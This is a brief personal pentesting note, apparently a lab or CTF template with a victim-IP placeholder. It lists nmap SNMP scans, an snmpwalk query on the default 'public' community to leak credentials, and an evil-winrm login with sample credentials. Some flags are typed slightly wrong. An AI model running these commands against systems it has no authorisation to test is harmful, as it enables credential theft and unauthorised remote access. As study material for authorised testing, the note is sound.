This will give you the username password or any hint for login

- It will get with autorecon (UDP Port)

```sh
nmap -sU -p161 --script "snmp-*" <% tp.frontmatter["IPVictima"] %>
```

```sh
nmap -n -vv -sV -sU -Pn -p 161,162 –script=snmp-processes,snmp-netstat <% tp.frontmatter["IPVictima"] %>
```

- this is command I have used in 2 3 machine to find username, password, or hint of user and pass

```sh
snmpwalk -v 1 -c public <% tp.frontmatter["IPVictima"] %>  NET-SNMP-EXTEND-MIB::nsExtendOutputFull 
```

- (login with this command)

```sh
evil-winrm -I <% tp.frontmatter["IPVictima"] %> -u ‘noman’ -p ‘nomanpassword’  
```

